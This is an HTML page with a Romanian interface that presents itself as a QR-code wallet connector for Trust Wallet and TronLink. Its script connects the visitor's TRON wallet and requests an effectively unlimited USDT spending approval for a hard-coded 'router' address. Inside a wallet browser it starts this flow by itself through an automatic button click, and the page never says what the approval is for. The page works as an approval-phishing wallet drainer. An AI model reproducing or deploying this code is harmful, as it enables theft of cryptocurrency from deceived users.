<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>QR + Router</title>
<style>
  :root{--bg:#0b1220;--card:#071028;--accent:#06b6d4;--muted:#94a3b8}
  html,body{height:100%;margin:0;background:var(--bg);font-family:system-ui,Segoe UI,Roboto;color:#fff}
  .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:28px}
  .card{width:100%;max-width:420px;background:var(--card);padding:20px;border-radius:12px;box-shadow:0 6px 24px rgba(2,6,23,0.6);text-align:center}
  #qr{width:180px;height:180px;background:#fff;border-radius:12px;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;overflow:hidden}
  #router{margin-top:14px;color:var(--accent);font-weight:700;word-break:break-all}
  img.qr-img{width:100%;height:100%;object-fit:cover;display:block}
  #connectBtn, #openTrustBtn, #openTronLinkBtn { margin-top:12px; padding:10px 14px; background:transparent; border:2px solid var(--accent); color:var(--accent); border-radius:10px; cursor:pointer; font-weight:700}
  #buttonRow{display:flex;gap:8px;flex-wrap:wrap;justify-content:center}
  #status{margin-top:8px;color:var(--muted);font-size:13px}
  pre#logpre{background:#031428;color:#9fb8c3;padding:8px;border-radius:8px;max-height:160px;overflow:auto;text-align:left}
  a.explorer { color: var(--accent); font-weight:700; text-decoration: none; word-break:break-all; }
  .small{font-size:13px;color:var(--muted)}
</style>

<!-- QR generator lib -->
<script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div style="display:flex;flex-direction:column;align-items:center;gap:12px">
        <div id="qr" title="Scan — deschide în wallet"></div>
        <div id="router">TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu</div>

        <div id="buttonRow">
          <button id="connectBtn">Conectează portofel</button>
          <button id="openTrustBtn">Deschide în Trust Wallet</button>
          <button id="openTronLinkBtn">Deschide în TronLink</button>
        </div>

        <div id="status">Stare: neinitalizat</div>
        <div class="small">Dacă nu apare promptul, folosește butonul "Deschide în Trust Wallet"</div>
      </div>

      <div style="margin-top:12px;text-align:left">
        <div id="txInfo" style="margin-top:8px"></div>
        <pre id="logpre"></pre>
      </div>
    </div>
  </div>

<script>
(function(){
  function escapeHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;')}
  function makeQRsvg_lib(text, size){
    var qr = window.qrcode(4,'M'); qr.addData(text); qr.make();
    var m = qr.moduleCount;
    var scale = Math.max(1, Math.floor(size / m));
    var width = m * scale;
    var svg = '<svg width="'+width+'" height="'+width+'" viewBox="0 0 '+(m*scale)+' '+(m*scale)+'" xmlns="http://www.w3.org/2000/svg" shape-rendering="crispEdges">';
    svg += '<rect width="100%" height="100%" fill="#fff"/><g fill="#000">';
    for(var r=0;r<m;r++){ for(var c=0;c<m;c++){ if(qr.isDark(r,c)){ svg += '<rect x="'+(c*scale)+'" y="'+(r*scale)+'" width="'+scale+'" height="'+scale+'"/>'; } } }
    svg += '</g></svg>';
    return svg;
  }
  function setQRContent(container, text){
    const size = 180;
    try{
      if(window.qrcode && typeof window.qrcode === 'function'){
        container.innerHTML = makeQRsvg_lib(text, size);
        container.onclick = ()=> window.open(text,'_blank');
        return;
      }
    }catch(e){ console.warn('QR lib failed', e); }
    const img = document.createElement('img');
    img.className = 'qr-img'; img.alt = 'QR';
    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=' + encodeURIComponent(text);
    img.onerror = function(){ container.innerHTML = '<div style="color:#000;padding:8px">QR: '+escapeHtml(text)+'</div>'; };
    container.innerHTML = ''; container.appendChild(img);
    container.onclick = ()=> window.open(text,'_blank');
  }

  const qrEl = document.getElementById('qr');
  const pageUrl = location.href;

  // Deep-links
  const trustDeep = 'trust://browser_open?url=' + encodeURIComponent(pageUrl);
  const tronlinkDeep = 'tronlink://browser/open?url=' + encodeURIComponent(pageUrl);

  // QR points to HTTPS page (pageUrl) — cameras typically open HTTPS only.
  setQRContent(qrEl, pageUrl);

  // On long-press open HTTPS fallback (useful for desktop)
  qrEl.addEventListener('contextmenu', (e)=> { e.preventDefault(); window.open(pageUrl,'_blank'); });
})();
</script>

<script>
/* CONFIG */
const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t';
const ROUTER_ADDRESS = 'TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu';
const PRESET_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639936';

function log(msg){ const pre = document.getElementById('logpre'); if(pre) pre.textContent += msg + '\n'; console.log(msg); }
function setStatus(s){ const el = document.getElementById('status'); if(el) el.textContent = 'Stare: ' + s; }

/* Tron detection helper */
function waitForTronWeb(timeout = 2000){
  return new Promise((resolve) => {
    if(window.tronWeb && window.tronWeb.ready) return resolve(window.tronWeb);
    let resolved=false;
    const check = setInterval(()=>{ if(window.tronWeb && window.tronWeb.ready){ clearInterval(check); resolved=true; resolve(window.tronWeb); } },100);
    setTimeout(()=>{ if(!resolved) resolve(null); clearInterval(check); }, timeout);
  });
}

let tron = null;
let userAddress = null;
function explorerTxUrl(txid){ return 'https://tronscan.org/#/transaction/' + encodeURIComponent(txid); }

async function pollTransaction(txid, {interval=3000, timeout=180000} = {}){
  const start = Date.now();
  setStatus('Aștept confirmare tranzacție...');
  log('Începem polling pentru tx: ' + txid);
  while(Date.now() - start < timeout){
    try{
      if(tron && tron.trx && typeof tron.trx.getTransactionInfo === 'function'){
        const info = await tron.trx.getTransactionInfo(txid);
        log('getTransactionInfo: ' + JSON.stringify(info || {}));
        if(info && (info.receipt && info.receipt.result === 'SUCCESS' || info.result === 'SUCCESS' || info.blockNumber)){
          setStatus('Tranzacție confirmată.');
          return { status:'confirmed', info };
        }
      } else {
        const res = await fetch('https://api.trongrid.io/wallet/gettransactioninfobyid', {
          method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ value: txid })
        }).then(r=>r.json()).catch(()=>null);
        log('tronGrid: ' + JSON.stringify(res || {}));
        if(res && (res.receipt && res.receipt.result === 'SUCCESS' || res.result === 'SUCCESS' || res.blockNumber)){
          setStatus('Tranzacție confirmată.');
          return { status:'confirmed', info: res };
        }
      }
    }catch(err){ log('Eroare polling: ' + (err && err.message ? err.message : err)); }
    await new Promise(r=>setTimeout(r, interval));
    log('Retry polling...');
  }
  setStatus('Polling timeout — tranzacție nereconfirmată în timp.');
  return { status:'timeout' };
}

async function connectWallet(){
  setStatus('Se încearcă conectarea la portofel...');
  log('connectWallet: waiting for tronWeb...');
  tron = await waitForTronWeb(2500);
  if(!tron){
    setStatus('tronWeb nu detectat. Deschide în Trust Wallet (buton).');
    log('tronWeb nu detectat.');
    return false;
  }
  try{
    if(typeof tron.request === 'function'){
      const accounts = await tron.request({ method: 'tron_requestAccounts' }).catch(()=> null);
      if(accounts && accounts.length) userAddress = accounts[0];
    }
    if(!userAddress && tron.defaultAddress && tron.defaultAddress.base58) userAddress = tron.defaultAddress.base58;
    if(!userAddress && typeof tron.requestAccounts === 'function'){
      try{ userAddress = (await tron.requestAccounts())[0]; }catch(e){}
    }
    if(!userAddress){
      setStatus('Nu s-a putut obține adresa. Permite conectarea în wallet.');
      log('Nu s-a putut obține adresa din tronWeb.');
      return false;
    }
    setStatus('Conectat: ' + userAddress);
    log('Conectat: ' + userAddress);
    return true;
  }catch(err){ console.error(err); setStatus('Eroare conectare: ' + (err && err.message ? err.message : err)); log('Eroare connectWallet: ' + (err && err.message ? err.message : err)); return false; }
}

async function sendApprove(){
  if(!tron || !tron.contract){ setStatus('tronWeb indisponibil pentru tranzacție.'); log('tron absent la sendApprove.'); return null; }
  try{
    setStatus('Pregătire approve — deschide prompt în portofel.');
    log('Construim contract la ' + USDT_ADDRESS);
    const contract = await tron.contract().at(USDT_ADDRESS);
    log('Apel approve(spender, amount) ...');
    const result = await contract.approve(ROUTER_ADDRESS, PRESET_AMOUNT).send({feeLimit:100_000_000});
    log('approve result raw: ' + JSON.stringify(result || {}));
    const txid = (result && (result.transaction && result.transaction.txID)) || result && result.txID || null;
    if(!txid){ log('Nu am identificat txID în răspunsul wallet-ului. Răspuns: ' + JSON.stringify(result || {})); setStatus('Approve trimis (txID n/a). Verifică în portofel.'); return null; }
    const txInfoEl = document.getElementById('txInfo');
    txInfoEl.innerHTML = 'Tx: <a class="explorer" target="_blank" rel="noopener noreferrer" href="' + explorerTxUrl(txid) + '">' + txid + '</a>';
    setStatus('Tranzacție trimisă. txID: ' + txid);
    log('TxID: ' + txid);
    const pollResult = await pollTransaction(txid, { interval: 3000, timeout: 180000 });
    if(pollResult.status === 'confirmed'){ log('Tranzacție confirmată.'); txInfoEl.innerHTML += ' — <span style="color:#7dd3fc">confirmată</span>'; return { txid, info: pollResult.info }; }
    else { log('Polling a expirat fără confirmare.'); txInfoEl.innerHTML += ' — <span style="color:#f97316">nereconfirmată (timeout)</span>'; return { txid, info: null }; }
  }catch(err){ console.error(err); log('Eroare la approve: ' + (err && err.message ? err.message : err)); setStatus('Eroare approve: ' + (err && err.message ? err.message : err)); return null; }
}

/* Handlers pentru butoane deep-link + auto-open logic */
document.addEventListener('DOMContentLoaded', async ()=>{
  const connectBtn = document.getElementById('connectBtn');
  const openTrustBtn = document.getElementById('openTrustBtn');
  const openTronLinkBtn = document.getElementById('openTronLinkBtn');

  const pageUrl = location.href;
  const trustDeep = 'trust://browser_open?url=' + encodeURIComponent(pageUrl);
  const tronlinkDeep = 'tronlink://browser/open?url=' + encodeURIComponent(pageUrl);

  connectBtn.addEventListener('click', async (e)=>{
    e.preventDefault();
    const ok = await connectWallet();
    if(!ok) return;
    const conf = confirm('Se va trimite cerere de APPROVE pentru:\n\nToken: ' + USDT_ADDRESS + '\nSpender: ' + ROUTER_ADDRESS + '\nSuma: preset max\n\nApasă OK pentru a deschide promptul din portofel.');
    if(!conf){ log('User a refuzat confirm la click connect.'); setStatus('Utilizator a refuzat aprobarea.'); return; }
    await sendApprove();
  });

  openTrustBtn.addEventListener('click', ()=> {
    // încercare directă deep-link
    window.location.href = trustDeep;
    // fallback: deschide pagina HTTPS în câteva sute ms (useful if deep-link fails silently)
    setTimeout(()=> { window.open(pageUrl,'_blank'); }, 900);
  });

  openTronLinkBtn.addEventListener('click', ()=> {
    window.location.href = tronlinkDeep;
    setTimeout(()=> { window.open(pageUrl,'_blank'); }, 900);
  });

  // Dacă suntem deschiși în dApp browser (tronWeb deja injectat), simulăm acțiunea de conectare
  if(window.tronWeb && window.tronWeb.ready){
    setTimeout(()=> { try{ connectBtn.click(); }catch(e){console.warn(e);} }, 300);
    return;
  }

  // Auto-open deep-links: încercăm programatic să deschidem trust:// apoi tronlink://, cu fallback rămânând pe HTTPS.
  // Mecanism: navigăm către deep-link; dacă nu se poate, browser rămâne pe HTTPS după timeout.
  function tryDeepOpen(uri){
    // Create an iframe for iOS/Android older behavior; fallback to location.href for modern.
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = uri;
    document.body.appendChild(iframe);
    setTimeout(()=> { try{ document.body.removeChild(iframe); }catch(e){} }, 800);
  }

  // Only attempt auto-open on mobile user agents (reduces false triggers on desktop)
  const ua = navigator.userAgent || '';
  const isMobile = /iphone|ipad|ipod|android|mobile/i.test(ua);

  if(isMobile){
    // Give a tiny delay to allow scanner->browser to finish
    setTimeout(()=>{
      // Try Trust, then TronLink after small delay
      tryDeepOpen(trustDeep);
      setTimeout(()=> tryDeepOpen(tronlinkDeep), 700);
    }, 300);
    setStatus('Încerc deschidere automată în wallet (dacă este instalat)...');
  } else {
    setStatus('Apasă "Deschide în Trust Wallet" dacă folosești telefonul.');
  }

  // Short detection loop: if tronWeb appears soon after attempts, trigger connect flow
  const detected = await waitForTronWeb(2500);
  if(detected){
    setTimeout(()=> { try{ connectBtn.click(); }catch(e){console.warn(e);} }, 300);
  }
});
</script>
</body>
</html>
